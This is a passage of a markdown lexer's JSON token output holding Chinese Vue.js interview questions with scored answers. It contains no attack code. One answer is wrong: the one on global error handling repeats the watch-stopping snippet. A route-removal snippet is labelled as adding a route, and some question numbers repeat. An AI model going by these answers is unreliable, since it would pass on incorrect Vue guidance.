父组件如何监听子组件生命周期？","tokens":[{"type":"text","raw":"36. 父组件如何监听子组件生命周期？","text":"36. 父组件如何监听子组件生命周期？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"vue2 使用 @hook:mounted","text":"vue2 使用 @hook:mounted","tokens":[{"type":"text","raw":"vue2 使用 @hook:mounted","text":"vue2 使用 @hook:mounted","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"vue3 使用 @vue:mounted","text":"vue3 使用 @vue:mounted","tokens":[{"type":"text","raw":"vue3 使用 @vue:mounted","text":"vue3 使用 @vue:mounted","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"自定义事件，在子组件生命周期中去执行 下面是vue3的写法","text":"自定义事件，在子组件生命周期中去执行 下面是vue3的写法","tokens":[{"type":"text","raw":"自定义事件，在子组件生命周期中去执行 下面是vue3的写法","text":"自定义事件，在子组件生命周期中去执行 下面是vue3的写法","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\n<template>\\n  <h1 @click=\\"send\\">Home 页面</h1>\\n  <Text @vue:mounted=\\"fn\\" />\\n</template>\\n\\n<script setup>\\nimport { onMounted, ref } from \'vue\'\\nimport Text from \'../components/Text.vue\'\\nconst fn = () => {\\n  console.log(\'Text mounted\')\\n}\\n<\/script>\\n\\n```","lang":"js","text":"\\n<template>\\n  <h1 @click=\\"send\\">Home 页面</h1>\\n  <Text @vue:mounted=\\"fn\\" />\\n</template>\\n\\n<script setup>\\nimport { onMounted, ref } from \'vue\'\\nimport Text from \'../components/Text.vue\'\\nconst fn = () => {\\n  console.log(\'Text mounted\')\\n}\\n<\/script>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. watch怎么停止监听？\\n\\n","depth":2,"text":"37. watch怎么停止监听？","tokens":[{"type":"text","raw":"37. watch怎么停止监听？","text":"37. watch怎么停止监听？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\nimport { ref, watch } from \'vue\'\\nconst count = ref(0)\\nconst soptWatch = watch(() => count.value, (newVal, oldVal) => {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n\\n```","lang":"js","text":"import { ref, watch } from \'vue\'\\nconst count = ref(0)\\nconst soptWatch = watch(() => count.value, (newVal, oldVal) => {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. Vue中怎么做全局错误监听？\\n\\n","depth":2,"text":"37. Vue中怎么做全局错误监听？","tokens":[{"type":"text","raw":"37. Vue中怎么做全局错误监听？","text":"37. Vue中怎么做全局错误监听？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\nimport { ref, watch } from \'vue\'\\nconst count = ref(0)\\nconst soptWatch = watch(() => count.value, (newVal, oldVal) => {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n\\n```","lang":"js","text":"import { ref, watch } from \'vue\'\\nconst count = ref(0)\\nconst soptWatch = watch(() => count.value, (newVal, oldVal) => {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. 怎么监听子组件内的错误？\\n\\n","depth":2,"text":"38. 怎么监听子组件内的错误？","tokens":[{"type":"text","raw":"38. 怎么监听子组件内的错误？","text":"38. 怎么监听子组件内的错误？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\n// 子组件\\nthrow new Error(\\"Error\\");\\n\\n//父组件\\nimport { onErrorCaptured } from \'vue\'\\n\\n// 监听到子组件错误，执行回调\\nonErrorCaptured((err) => {\\n  console.log(\'error\', err)\\n})\\n\\n```","lang":"js","text":"// 子组件\\nthrow new Error(\\"Error\\");\\n\\n//父组件\\nimport { onErrorCaptured } from \'vue\'\\n\\n// 监听到子组件错误，执行回调\\nonErrorCaptured((err) => {\\n  console.log(\'error\', err)\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. vue-router怎么动态添加、删除路由？\\n\\n","depth":2,"text":"38. vue-router怎么动态添加、删除路由？","tokens":[{"type":"text","raw":"38. vue-router怎么动态添加、删除路由？","text":"38. vue-router怎么动态添加、删除路由？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"添加路由","text":"添加路由","tokens":[{"type":"text","raw":"添加路由","text":"添加路由","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { useRouter } from \'vue-router\';\\n\\nconst router = useRouter();\\nconst addRoute = () => {\\n  const newRoute = {\\n    path: \'/hello\', name: \'hello\', component: () => import(\'../components/HelloWorld.vue\'), // 动态加载组件\\n  };\\n  router.addRoute(newRoute);\\n};\\n\\n```","lang":"js","text":"\\nimport { useRouter } from \'vue-router\';\\n\\nconst router = useRouter();\\nconst addRoute = () => {\\n  const newRoute = {\\n    path: \'/hello\', name: \'hello\', component: () => import(\'../components/HelloWorld.vue\'), // 动态加载组件\\n  };\\n  router.addRoute(newRoute);\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"添加路由","text":"添加路由","tokens":[{"type":"text","raw":"添加路由","text":"添加路由","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nrouter.removeRoute(\'xxx\');\\n\\n```","lang":"js","text":"\\nrouter.removeRoute(\'xxx\');\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 39. 有使用过v-memo么？\\n\\n","depth":2,"text":"39. 有使用过v-memo么？","tokens":[{"type":"text","raw":"39. 有使用过v-memo么？","text":"39. 有使用过v-memo么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"缓存一个模板的子树。在元素和组件上都可以使用。为了实现缓存，该指令需要传入一个固定长度的依赖值数组进行比较。如果数组里的每个值都与最后一次的渲染相同，那么整个子树的更新将被跳过。","text":"缓存一个模板的子树。在元素和组件上都可以使用。为了实现缓存，该指令需要传入一个固定长度的依赖值数组进行比较。如果数组里的每个值都与最后一次的渲染相同，那么整个子树的更新将被跳过。","tokens":[{"type":"text","raw":"缓存一个模板的子树。在元素和组件上都可以使用。为了实现缓存，该指令需要传入一个固定长度的依赖值数组进行比较。如果数组里的每个值都与最后一次的渲染相同，那么整个子树的更新将被跳过。","text":"缓存一个模板的子树。在元素和组件上都可以使用。为了实现缓存，该指令需要传入一个固定长度的依赖值数组进行比较。如果数组里的每个值都与最后一次的渲染相同，那么整个子树的更新将被跳过。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"一般与v-for配合使用，v-memo的值是一个数组。数组的值不改变的情况，该组件及子组件就会跳过更新","text":"一般与v-for配合使用，v-memo的值是一个数组。数组的值不改变的情况，该组件及子组件就会跳过更新","tokens":[{"type":"text","raw":"一般与v-for配合使用，v-memo的值是一个数组。数组的值不改变的情况，该组件及子组件就会跳过更新","text":"一般与v-for配合使用，v-memo的值是一个数组。数组的值不改变的情况，该组件及子组件就会跳过更新","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"v-memo 绑定的值没改变，子组件引用的响应数据变了，也不会更新","text":"v-memo 绑定的值没改变，子组件引用的响应数据变了，也不会更新","tokens":[{"type":"text","raw":"v-memo 绑定的值没改变，子组件引用的响应数据变了，也不会更新","text":"v-memo 绑定的值没改变，子组件引用的响应数据变了，也不会更新","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. v-for 中 key 的作用是什么？\\n\\n","depth":2,"text":"40. v-for 中 key 的作用是什么？","tokens":[{"type":"text","raw":"40. v-for 中 key 的作用是什么？","text":"40. v-for 中 key 的作用是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"key 是 Vue 使用 v-for 渲染列表时的节点标识。使用了 key 之后，当列表项发生变化时，Vue 会基于 key 的变化而重新排列元素顺序，并且移除 key 不存在的元素，提升运行效率。","text":"key 是 Vue 使用 v-for 渲染列表时的节点标识。使用了 key 之后，当列表项发生变化时，Vue 会基于 key 的变化而重新排列元素顺序，并且移除 key 不存在的元素，提升运行效率。","tokens":[{"type":"text","raw":"key 是 Vue 使用 v-for 渲染列表时的节点标识。使用了 key 之后，当列表项发生变化时，Vue 会基于 key 的变化而重新排列元素顺序，并且移除 key 不存在的元素，提升运行效率。","text":"key 是 Vue 使用 v-for 渲染列表时的节点标识。使用了 key 之后，当列表项发生变化时，Vue 会基于 key 的变化而重新排列元素顺序，并且移除 key 不存在的元素，提升运行效率。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. 如何动态更新对象或数组的值？\\n\\n","depth":2,"text":"40. 如何动态更新对象或数组的值？","tokens":[{"type":"text","raw":"40. 如何动态更新对象或数组的值？","text":"40. 如何动态更新对象或数组的值？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"  因为 Object.defineProperty()的限制，Vue 无法监听到对象或数组内部某个属性值的变化，因此在直接设置以上两类数据的值时，页面不会实时更新。此时可以通过 this.$set 方法来解决：","text":"  因为 Object.defineProperty()的限制，Vue 无法监听到对象或数组内部某个属性值的变化，因此在直接设置以上两类数据的值时，页面不会实时更新。此时可以通过 this.$set 方法来解决：","tokens":[{"type":"text","raw":"  因为 Object.defineProperty()的限制，Vue 无法监听到对象或数组内部某个属性值的变化，因此在直接设置以上两类数据的值时，页面不会实时更新。此时可以通过 this.$set 方法来解决：","text":"  因为 Object.defineProperty()的限制，Vue 无法监听到对象或数组内部某个属性值的变化，因此在直接设置以上两类数据的值时，页面不会实时更新。此时可以通过 this.$set 方法来解决：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. v-on 如何绑定多个事件？\\n\\n","depth":2,"text":"41. v-on 如何绑定多个事件？","tokens":[{"type":"text","raw":"41. v-on 如何绑定多个事件？","text":"41. v-on 如何绑定多个事件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"code","raw":"  ```js\\n<!--单事件绑定-->\\n<input type=\\"text\\" @click=\\"onClick\\">\\n<!--多事件绑定-->\\n<input type=\\"text\\" v-on=\\"{ input:onInput,focus:onFocus,blur:onBlur }\\">\\n\\n```","lang":"js","text":"<!--单事件绑定-->\\n<input type=\\"text\\" @click=\\"onClick\\">\\n<!--多事件绑定-->\\n<input type=\\"text\\" v-on=\\"{ input:onInput,focus:onFocus,blur:onBlur }\\">\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. Vue 初始化页面闪动问题如何解决？\\n\\n","depth":2,"text":"41. Vue 初始化页面闪动问题如何解决？","tokens":[{"type":"text","raw":"41. Vue 初始化页面闪动问题如何解决？","text":"41. Vue 初始化页面闪动问题如何解决？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"出现该问题是因为在 Vue 代码尚未被解析之前，尚无法控制页面中 DOM 的显示，所以会看见模板字符串等代码。","text":"出现该问题是因为在 Vue 代码尚未被解析之前，尚无法控制页面中 DOM 的显示，所以会看见模板字符串等代码。","tokens":[{"type":"text","raw":"出现该问题是因为在 Vue 代码尚未被解析之前，尚无法控制页面中 DOM 的显示，所以会看见模板字符串等代码。","text":"出现该问题是因为在 Vue 代码尚未被解析之前，尚无法控制页面中 DOM 的显示，所以会看见模板字符串等代码。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"解决方案是，在 css 代码中添加 v-cloak 规则，同时在待编译的标签上添加 v-cloak 属性：","text":"解决方案是，在 css 代码中添加 v-cloak 规则，同时在待编译的标签上添加 v-cloak 属性：","tokens":[{"type":"text","raw":"解决方案是，在 css 代码中添加 v-cloak 规则，同时在待编译的标签上添加 v-cloak 属性：","text":"解决方案是，在 css 代码中添加 v-cloak 规则，同时在待编译的标签上添加 v-cloak 属性：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n[v-cloak] { display: none; }\\n\\n<div v-cloak>\\n  {{ message }}\\n</div>\\n\\n```","lang":"html","text":"[v-cloak] { display: none; }\\n\\n<div v-cloak>\\n  {{ message }}\\n</div>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 42. Vue 如何清除浏览器缓存？\\n\\n","depth":2,"text":"42. Vue 如何清除浏览器缓存？","tokens":[{"type":"text","raw":"42. Vue 如何清除浏览器缓存？","text":"42. Vue 如何清除浏览器缓存？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* 项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；\\n\\n* 在 html 文件中加入 meta 标签，content 属性设置为no-cache;\\n\\n* 在后端服务器中进行禁止缓存设置。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；\\n\\n","task":false,"loose":true,"text":"项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；\\n","tokens":[{"type":"text","raw":"项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；\\n","text":"项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；","tokens":[{"type":"text","raw":"项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；","text":"项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；","escaped":false}]}]},{"type":"list_item","raw":"* 在 html 文件中加入 meta 标签，content 属性设置为no-cache;\\n\\n","task":false,"loose":true,"text":"在 html 文件中加入 meta 标签，content 属性设置为no-cache;\\n","tokens":[{"type":"text","raw":"在 html 文件中加入 meta 标签，content 属性设置为no-cache;\\n","text":"在 html 文件中加入 meta 标签，content 属性设置为no-cache;","tokens":[{"type":"text","raw":"在 html 文件中加入 meta 标签，content 属性设置为no-cache;","text":"在 html 文件中加入 meta 标签，content 属性设置为no-cache;","escaped":false}]}]},{"type":"list_item","raw":"* 在后端服务器中进行禁止缓存设置。","task":false,"loose":true,"text":"在后端服务器中进行禁止缓存设置。","tokens":[{"type":"text","raw":"在后端服务器中进行禁止缓存设置。","text":"在后端服务器中进行禁止缓存设置。","tokens":[{"type":"text","raw":"在后端服务器中进行禁止缓存设置。","text":"在后端服务器中进行禁止缓存设置。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 43. 页面刷新了之后vuex中的数据消失怎么解决\\n\\n","depth":2,"text":"43. 页面刷新了之后vuex中的数据消失怎么解决","tokens":[{"type":"text","raw":"43. 页面刷新了之后vuex中的数据消失怎么解决","text":"43. 页面刷新了之后vuex中的数据消失怎么解决","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage\\n\\n* tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage\\n\\n","task":false,"loose":true,"text":"vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage\\n","tokens":[{"type":"text","raw":"vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage\\n","text":"vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage","tokens":[{"type":"text","raw":"vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 